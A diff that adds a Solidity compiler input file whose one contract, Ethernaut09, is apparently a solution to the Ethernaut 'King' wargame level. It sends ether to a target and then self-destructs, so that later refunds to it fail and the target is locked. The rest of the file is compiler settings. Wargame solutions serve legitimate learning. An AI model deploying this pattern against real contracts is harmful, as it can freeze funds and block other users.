@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Ethernaut09.sol": {
+      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.17;\n\ncontract Ethernaut09 {\n    // to solve this level, can not implement a fallback function, implement a malicious fallback function that reverts the transaction, or destroy the contract so that it cannot be sent ether\n    function hack(address _address) public payable {\n        address payable addr = payable(_address);\n        addr.transfer(msg.value);\n        selfdestruct(payable(msg.sender));\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
